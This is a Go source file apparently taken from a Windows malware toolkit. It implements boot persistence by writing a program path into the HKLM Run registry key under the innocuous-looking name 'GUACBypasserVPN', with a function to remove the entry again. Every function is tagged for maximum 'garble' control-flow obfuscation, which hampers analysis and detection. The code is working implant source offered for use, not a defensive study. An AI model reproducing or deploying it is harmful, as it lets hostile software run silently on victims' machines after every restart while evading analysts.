// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package persist

import (
	"errors"
	"strconv"

	"golang.org/x/sys/windows/registry"
)

type ExecutorHklm struct{}
//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
func (e ExecutorHklm) findKey() (string, error) {
	var key string
	if strconv.IntSize == 32 {
		key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	} else if strconv.IntSize == 64 {
		key = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
	} else {
		return "<nil>", errors.New("unknown architecture, cannot find HKLM path")
	}
	return key, nil
}
//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
func (e ExecutorHklm) Exec(path string) error {
	kpath, err := e.findKey()
	if err != nil {
		return err
	}
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, kpath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	err = k.SetStringValue("GUACBypasserVPN", path)
	return err
}
//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
func (e ExecutorHklm) Revert() error {
	kpath, err := e.findKey()
	if err != nil {
		return err
	}
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, kpath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	err = k.DeleteValue("GUACBypasserVPN")
	return err
}
